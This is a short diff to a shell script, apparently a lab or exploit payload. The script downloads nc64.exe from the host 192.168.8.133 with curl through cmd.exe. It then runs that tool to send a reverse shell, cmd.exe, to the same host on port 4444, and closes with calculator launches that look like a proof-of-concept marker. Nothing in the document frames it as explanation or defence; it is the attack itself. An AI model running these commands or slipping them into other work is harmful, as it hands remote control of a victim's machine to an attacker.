@@ -1,5 +1,5 @@
 #!/bin/bash
-cmd.exe /c "curl http://192.168.8.133:8000/nc64.exe -O ~/nc64.exe"
+cmd.exe /c "curl http://192.168.8.133:8000/nc64.exe -O C:\Users\Admin\nc64.exe"
 ~/nc64.exe 192.168.8.133 4444 -e cmd.exe -d
 calc.exe
 open -a Calculator.app
